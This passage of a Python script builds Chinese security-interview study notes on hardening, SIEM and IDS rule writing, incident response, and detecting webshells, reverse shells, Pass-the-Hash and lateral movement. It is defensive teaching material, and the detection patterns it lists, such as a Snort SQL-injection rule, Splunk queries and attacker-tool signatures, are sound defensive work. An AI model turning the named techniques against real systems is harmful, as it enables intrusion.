        11: ("Day 11：弱口令与访问控制", "[认证安全面试核心] 密码策略/暴力破解防御/MFA/访问控制模型"),
        12: ("Day 12：主机安全加固", "[主机加固面试核心] OS按CIS Benchmark加固/服务最小化/文件完整性"),
        13: ("Day 13：网络设备安全加固", "[网络设备加固面试核心] SSHv2/ACL精化/SNMPv3/Banner隐藏"),
        14: ("Day 14：应用系统安全加固", "[应用加固面试核心] Web服务器加固/TLS配置/数据库加固"),
        15: ("Day 15：数据库安全加固", "[数据库加固面试核心] 账号管理/审计/加密/TDE/脱敏"),
        16: ("Day 16：安全策略配置与优化", "[安全策略面试核心] 防火墙策略审计/GPO合规/零信任策略"),
        17: ("Day 17：入侵检测规则编写", "[IDS规则面试核心] Snort/Suricata规则语法/检测工程/Sigma"),
        18: ("Day 18：SIEM告警分析", "[SIEM分析面试核心] 告警研判/Splunk SPL/ELK KQL/关联规则"),
        19: ("Day 19：安全事件研判", "[事件研判面试核心] Triage流程/告警分级/误报处理/升级标准"),
        20: ("Day 20：应急响应基础", "[IR基础面试核心] 响应流程/取证基础/遏制策略/沟通模板"),
        21: ("Day 21：恶意代码分析", "[恶意代码分析面试核心] 静态/动态分析/沙箱/逆向基础/PE结构"),
        22: ("Day 22：邮件安全分析", "[邮件安全面试核心] 邮件头分析/SPF/DKIM/DMARC/钓鱼邮件识别"),
        23: ("Day 23：Web攻击检测", "[Web检测面试核心] WAF日志分析/SQL注入检测/XSS检测/WEBSHELL发现"),
        24: ("Day 24：内网攻击检测", "[内网检测面试核心] 横向移动/Lateral Movement/Pass-the-Hash检测"),
        25: ("Day 25：DNS安全分析", "[DNS安全面试核心] DNS隧道检测/DGA域名/DNS日志分析"),
        26: ("Day 26：横向移动检测", "[横向移动检测面试核心] PsExec/WMI/PowerShell Remoting/SMB检测"),
    }
    key_points = {
        11: [("暴力破解的防御层次", "1. 账户锁定策略(5次失败锁定30分钟) 2. MFA多因素(密码+App/Token/生物) 3. 地理IP信誉(GeoIP+威胁情报拒绝高风险IP) 4. CAPTCHA挑战(人机验证) 5. 速率限制(Rate Limiting→单个IP每秒最多1次登录尝试)\n\n面试加分：提到Passwordless(Windows Hello/FIDO2)是终极方案→没有密码就没有爆破")],
        12: [("CIS Benchmark在主机加固中的应用", "操作系统加固：禁用不必要的服务(Telnet/FTP)、最小的用户组权限、密码复杂度策略、审计日志全开、文件系统权限收紧(/etc/shadow→000/root) + USB存储禁用(仅允许已授权的加密USB) + 应用白名单(AppLocker/WDAC)\n\n面试亮点：能举出实际加固前后对比数据(如将CIS Score从60%提升到95%)")],
        13: [("网络设备安全加固的十条基准", "①换掉默认密码 ②Telnet禁→SSHv2 ③SNMP v1/v2禁→v3(AuthPriv) ④Banner不泄露型号版本 ⑤ACL精确(拒绝any any放最后) ⑥管理平面ACL限制来源IP ⑦NTP配置防止时间攻击 ⑧CDP/LLDP按需关闭 ⑨端口安全(port-security MAC限制) ⑩未用端口shutdown\n\n面试提示：这些是网络设备安全105题—面试官想听的是优先级：默认凭据>远程管理>管理平面ACL>日志审计")],
        14: [("Web服务器加固的关键点", "Nginx/Apache加固：隐藏版本号、限制HTTP方法(GET/POST/HEAD排除PUT/DELETE/TRACE)、配置超时(client_body_timeout)、禁用目录列表、限制请求体大小(client_max_body_size)\nTLS配置：只开TLS1.2/1.3→禁用TLS1.0/1.1→禁用弱密码套件(RC4/DES/3DES)→HSTS开启→Mozilla SSL Configuration Generator是最佳参考")],
        15: [("数据库安全加固的核心措施", "账号管理：删默认账户(MySQL的test库/test用户)→限制root仅localhost登录→应用账号最少权限(只读/只写特定表)\n加密：TDE(透明数据加密)→数据文件在磁盘上是密文→即使拿到文件也无法读取\n审计：general_log+audit plugin→记录所有SQL→但性能代价大→一般开关键表的审计\n链接加密：强制TLS(require_secure_transport=ON)")],
        16: [("防火墙策略审计的五步法", "1. 全量导出策略→Excel/脚本去重 2. 找Any规则(any source/destination/service)→这是最危险的 3. 找影子规则(被上面更宽规则覆盖→永远匹配不到) 4. 命中率分析(从未命中的规则→潜在安全风险或可删除) 5. 业务Owner确认每条any/高风险策略的合理性→Gartner建议至少每季度一次")],
        17: [("Snort/Suricata规则的核心语法", "alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:'SQL Injection Attempt'; flow:to_server,established; content:'union'; nocase; content:'select'; nocase; distance:0; within:30; classtype:web-application-attack; sid:1000001; rev:1;)\n\n关键字段：content(匹配内容)、nocase(不区分大小写)、distance(从上个匹配之后多少字节开始)、within(在多少字节内必须匹配)、flow(定向+状态)\nSigma规则->翻译到SIEM查询，面试能讲Sigma体现你懂检测工程化")],
        18: [("Splunk SPL的常用安全分析查询", "搜索暴力破解：index=auth sourcetype=WinEventLog:Security EventCode=4625 | stats count by Account_Name,Source_Network_Address | where count > 10 | sort -count\n搜索进程创建：index=sysmon EventCode=1 ParentImage=*word.exe Image=*powershell.exe → 异常父进程(Word启动PowerShell=宏攻击)\n搜索横向移动：EventCode=4624 Logon_Type=3 AND Account_Name!=*$ → 非机器账户的网络登录→关注来源IP")],
        19: [("安全事件研判的Triage标准", "事件研判四象限：\n高严重+高可信→立即响应(15分钟SLA)→通知L2/L3+业务方\n高严重+低可信→快速验证(30分钟)→确认真伪后升级或关闭\n低严重+高可信→记录并观察→纳入威胁狩猎线索\n低严重+低可信→自动关闭→可以批量处理→降低分析师负担\n\n面试强调：Triage的核心是在有限信息和有限时间下做最优决策→不完美但快速比完美但太慢好")],
        20: [("应急响应的基础工具包清单", "必带工具：写保护USB+数字取证(Forensic Image采集工具FTK Imager/WinPmem)+内存采集(DumpIt)+网络抓包(tcpdump/Wireshark)+日志收集(Sysinternals/autoruns)+进程分析(Process Explorer/Hacker)\n\n事先准备：加密通信频道(Signal/Matrix)、联系人清单(安全负责人+业务Owner+网管+法务)、标准取证流程Checklist(避免手忙脚乱)")],
        21: [("恶意代码分析的静态与动态方法",
          "静态分析(不执行)：①文件格式分析→pecheck/Exeinfo PE→查壳+编译器信息 ②字符串提取→strings+floss-strings→找URL/IP/互斥量/加密字符串 ③导入表分析→DependencyWalker→看加载了哪些可疑API(CreateRemoteThread/WriteProcessMemory/VirtualAllocEx)\n"
          "动态分析(在沙箱执行)：Cuckoo Sandbox/Any.Run→观察进程/网络/文件/注册表行为→提取IOC(连接的C2域名/IP/下载的dropper/创建的持久化键)\n"
          "进阶：用IDA Pro/Ghidra做逆向工程→分析加密算法→编写解密脚本→提取C2配置")],
        22: [("钓鱼邮件分析的标准流程", "1. 检查邮件头：Received链→看真实发信IP是否与声称的发件域SPF一致。Authentication-Results→SPF/DKIM/DMARC状态\n2. 提取附件/URL：沙箱引爆(ANY.RUN/Joe Sandbox)→观察行为→URL重写到隔离浏览器打开\n3. 分析社会工程元素：制造紧迫感(您的账户将在24小时内停用!)/权威冒充(IT部门/CEO)/语法错误(非母语者)")],
        23: [("Webshell检测的动静结合方法", "静态：HIDS/Tripwire监控Web目录新增文件→文件哈希对比白名单→扩展名异常(.jpg却含PHP代码)\n动态：EDR/进程监控→Web进程(nobody/www-data)fork了bash/python/perl→危险信号。进程网络连接→Web进程对外发起TCP连接→反弹shell\n日志：Web访问日志分析→单一URI高频POST/User-Agent异常(中国蚁剑/冰蝎特征)/请求模式异常(心跳包规律性)")],
        24: [("内网攻击检测的关键信号", "横向移动检测五信号：\n①PsExec→目标机的$ADMIN共享被访问(Event 5140)+PsExec服务创建(Event 7045/4697)→服务名常见PSEXESVC\n②WMI执行→wmiprvse.exe加载了异常子进程→或WMI持久化(Event 5861, WMI活动)\n③PowerShell Remoting→winrm服务启动→目标机的wsmprovhost进程\n④Pass-the-Hash→Event 4624 LogonType=3+LogonProcess=NtLmSsp+AuthPkg=NTLM+不含域名的用户名→这些是PTH的特征\n⑤RDP→Event 4624 LogonType=10→关注非工作时间+异常IP")],
        25: [("DNS隧道和DGA域名的检测方法", "DNS隧道检测：FQDN平均长度>50字符(正常~30) / 查询类型分布异常(TXT/MX/CNAME比A/AAAA多) / 单个客户端短时间大量DNS查询(正常<1qps) / DNS查询的熵值高(base32/hex编码→字符分布均匀)\nDGA(Domain Generation Algorithm)检测：NXDOMAIN比例高(恶意软件生成大量不存在的域名只等1个注册) / 域名长度和熵值异常 / 同一受感染主机访问大量不同域的规律性")],
        26: [("横向移动检测的完整方案", "网络层面：NetFlow分析→内网东西向流量的偏离度→1台主机1小时内向>20台目标发起SMB(445)或WinRM(5985/5986)连接=>横向移动\n端点层面：EDR/Sysmon→Event 1进程创建(不以svchost作父进程的PsExec)/Event 3网络连接(SMB到多IP)/Event 7 DLL加载(异常路径的netapi32.dll=可能是利用SMB漏洞的工具)\nAD层面：Event 4768(TGT请求)的频率异常→Kerberoasting/AS-REP Roasting作为横向前置步骤")],
    }
    qas = key_points.get(daynum, [("请简单介绍一下你这个Day的核心内容", "这一天聚焦于护网工程中的安全检测和防御实践。核心是掌握对应的检测技术和加固方法，能够在面试中展示实际的排查能力和安全思维。")])
    add("hw", dayfile, titles[daynum][0], titles[daynum][1], qas,
        ["检测不是目的——目的是快速响应和持续改进规则", "规则不是一次性写完就完了——需要基于新攻击手法的变化持续更新", "实战护网中最高的评价是没出安全事件→不是因为你运气好而是因为你的检测和防御到位"],
        ["在实际环境中实践本Day的核心检测技术", "用ATT&CK框架映射你的检测覆盖→找到覆盖盲区", "将本Day的知识点写成一条Splunk/ELK检测规则"]
    )

# ================================================================
# 主程序
# ================================================================
def main():
    fixed = 0
    for key, data in CONTENT_DB.items():
        module, filename = key.split('/')
        fp = os.path.join(BASE, module, filename)
        if not os.path.exists(fp):
            print(f"SKIP (not found): {key}")
            continue
        with open(fp, 'r', encoding='utf-8') as f:
            content = f.read()
        if not is_template(content):
            print(f"SKIP (already enriched): {key}")
            continue
        md = render_md(data)
        with open(fp, 'w', encoding='utf-8') as f:
            f.write(md)
        fixed += 1
        print(f"FIXED: {key} ({len(md)} chars)")
    print(f"\nTotal fixed: {fixed}")

if __name__ == '__main__':
    main()
